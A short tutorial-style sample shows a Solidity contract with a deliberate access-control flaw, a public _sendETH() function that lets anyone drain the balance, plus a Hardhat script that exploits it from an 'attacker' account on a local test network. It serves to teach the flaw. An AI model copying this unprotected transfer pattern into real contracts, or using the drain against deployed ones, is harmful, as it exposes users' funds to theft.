Here is a simple smart contract with access control vulnerability
```
// SPDX-License-Identifier: MIT
// Access Control - Sample 1

pragma solidity ^0.7.0;

contract Sample1{
    address public owner;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "MyToken: caller is not the owner");
        _;
    }

    constructor(){
        owner = msg.sender;
    }
    
    function withdraw() external onlyOwner{
        require(msg.sender == owner, "Not Owner");
        _sendETH();
    }
    
    function _sendETH() public {
        msg.sender.transfer(address(this).balance);
    }
    
    receive() external payable{}
}
```

The _sendETH() is vulernerable. Although the withdraw() implemeted onlyOwner, _sendETH() could be called by anyone

hardhat test.js
```
// Access Control - Sample 1

const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await ethers.getSigners();

  // Deploy Sample1 contract
  const Sample1 = await ethers.getContractFactory("Sample1");
  const sample1 = await Sample1.deploy();
  await sample1.deployed();
  
  // Fund the contract with fake Ether
  await attacker.sendTransaction({
    to: sample1.address,
    value: ethers.utils.parseEther("10")
  });
  
  // Call _sendETH() function using the attacker's account
  await sample1.connect(attacker)._sendETH();

  console.log("Success! ETH has been sent to the attacker's account.");
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error);
    process.exit(1);
});
```
